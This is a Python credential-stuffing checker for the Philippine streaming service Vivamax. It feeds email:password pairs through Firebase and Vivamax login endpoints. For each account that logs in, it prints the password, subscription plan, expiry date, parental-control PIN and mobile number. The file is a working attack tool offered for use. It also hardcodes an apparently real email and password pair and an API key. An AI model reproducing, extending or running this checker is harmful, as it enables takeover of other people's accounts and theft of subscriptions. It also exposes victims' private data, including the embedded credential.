import requests
import time
import os
from datetime import datetime

INPUT_FILE = "input.txt"
HITS_FILE = "vivamax_hits.txt"

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# Plan mapping from the big JSON you sent
PLAN_MAPPING = {
    "three_months_app": {"price": "₱419.00", "billing": "3 months"},
    "one_month": {"price": "₱169.00", "billing": "1 month"},
    "one_month_max2": {"price": "₱499.00", "billing": "1 month"},
    "six_months_max2": {"price": "₱2490.00", "billing": "6 months"},
    "one_year_max2": {"price": "₱4790.00", "billing": "1 year"},
    "vmx_club_1-month": {"price": "₱99.00", "billing": "1 month"},
    "vmx_club_3-months": {"price": "₱269.00", "billing": "3 months"},
    "vmx_club_6-months": {"price": "₱499.00", "billing": "6 months"},
    "vmx_club_1-year": {"price": "₱949.00", "billing": "1 year"},
    # Add more if you see new plans
}

def check_vivamax(email: str, password: str):
    result = {
        'email': email,
        'password': password,
        'success': False,
        'displayName': 'N/A',
        'account_type': 'Unknown',
        'status': 'Unknown',
        'plan': 'Unknown',
        'expiry': 'N/A',
        'days_left': 'N/A',
        'stars': '—',
        'auto_renew': '—',
        'price': 'N/A',
        'billing': 'N/A',
        'pin': 'N/A',
        'mobile': 'N/A',
        'country': 'PH',
        'streams': '1',
        'message': ''
    }

    try:
        # Firebase Login
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://identity.vivamax.net',
            'referer': 'https://identity.vivamax.net/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }

        verify_url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBEUyk0R5bNsi_FCdK-L4Ztz5OENMA6O_U"

        resp = requests.post(verify_url, json={
            "email": email,
            "password": password,
            "returnSecureToken": True
        }, headers=headers, timeout=20)

        if resp.status_code != 200:
            result['message'] = "Invalid email or password"
            return result

        id_token = resp.json().get("idToken")
        if not id_token:
            result['message'] = "Login failed"
            return result

        # Vivamax Login
        login_url = "https://api2.vivamax.net/v1/viva/login"
        login_headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://vivamax.net',
            'referer': 'https://vivamax.net/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-appname': 'Vivamax/release-R60-6'
        }

        device_payload = {
            "idToken": id_token,
            "deviceType": "COMP",
            "modelNo": "20030107",
            "deviceName": "Win32",
            "deviceId": "-459410908",
            "serialNo": "-459410908"
        }

        viva_resp = requests.post(login_url, json=device_payload, headers=login_headers, timeout=20)

        if viva_resp.status_code not in (200, 201):
            result['message'] = f"Login failed ({viva_resp.status_code})"
            return result

        data = viva_resp.json()

        # === REAL DATA EXTRACTION ===
        result['success'] = True
        result['displayName'] = data.get("displayName", "N/A")
        result['status'] = data.get("subscriptionStatus", data.get("status", "UNKNOWN")).upper()
        result['plan'] = data.get("subscriptionId", "Unknown")
        result['pin'] = data.get("parentalControlPin", "N/A")
        result['mobile'] = data.get("mobileNumber", "N/A")
        result['country'] = data.get("subscriptionLocation", data.get("registerLocation", "PH"))

        # Expiry + Days Left
        expiry_ts = data.get("subscriptionExpiryTime")
        if expiry_ts:
            try:
                expiry_date = datetime.fromtimestamp(expiry_ts / 1000)
                result['expiry'] = expiry_date.strftime("%Y-%m-%d")
                days_left = (expiry_date - datetime.now()).days
                result['days_left'] = str(days_left)
            except:
                pass

        # Price & Billing from plan mapping
        plan_key = result['plan']
        if plan_key in PLAN_MAPPING:
            p = PLAN_MAPPING[plan_key]
            result['price'] = p["price"]
            result['billing'] = p["billing"]

        # Auto Renew
        sub = data.get("subscription", {})
        apple = sub.get("appleSubscriptionDetails", {})
        pending = apple.get("pending_renewal_info", [{}])[0]
        if pending.get("auto_renew_status") == "1":
            result['auto_renew'] = "ON"
        elif pending.get("auto_renew_status") == "0":
            result['auto_renew'] = "OFF"

        # Account Type
        if result['status'] == "ACTIVE" and plan_key != "Unknown":
            result['account_type'] = "Premium"
        elif result['status'] in ["EXPIRED", "INACTIVE"]:
            result['account_type'] = "Expired"
        else:
            result['account_type'] = "Free"

    except Exception as e:
        result['message'] = f"Error: {str(e)[:100]}"

    return result

def print_rich_result(result):
    print("\n" + "="*70)
    print("👤 Display Name :".ljust(22), result['displayName'])
    print("📧 Email       :".ljust(22), result['email'])
    print("🔑 Password    :".ljust(22), result['password'])
    print("="*70)
    print("📊 Account Type :".ljust(22), result['account_type'])
    print("📌 Plan        :".ljust(22), result['plan'])
    print("📅 Expiry      :".ljust(22), result['expiry'])
    print("⏳ Days Left   :".ljust(22), result['days_left'])
    print("⭐ Stars        :".ljust(22), result['stars'])
    print("🔄 AutoRenew   :".ljust(22), result['auto_renew'])
    print("💰 Price       :".ljust(22), result['price'])
    print("📆 Billing     :".ljust(22), result['billing'])
    print("🔐 PIN         :".ljust(22), result['pin'])
    print("📱 Mobile      :".ljust(22), result['mobile'])
    print("🌍 Country     :".ljust(22), result['country'])
    print("📺 Streams     :".ljust(22), result['streams'])
    print("📊 Status      :".ljust(22), result['status'])
    print("="*70)

def main():
    print("="*80)
    print("🇵🇭 VIVAMAX RICH CHECKER v13 - PRICE + BILLING FIXED")
    print("="*80)

    if not os.path.exists(INPUT_FILE):
        with open(INPUT_FILE, "w", encoding="utf-8") as f:
            f.write("lleotanph@gmail.com:May281983!!!\n")

    with open(INPUT_FILE, "r", encoding="utf-8", errors="ignore") as f:
        lines = [line.strip() for line in f if line.strip() and ":" in line]

    for i, line in enumerate(lines, 1):
        email, password = [x.strip() for x in line.split(":", 1)]
        print(f"\n[{i}/{len(lines)}] Checking → {email}")

        result = check_vivamax(email, password)

        if result['success']:
            print_rich_result(result)
        else:
            print(f"   {RED}BAD ✗{RESET} | {result['message']}")

        time.sleep(1.8)

    print("\nFinished!")
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()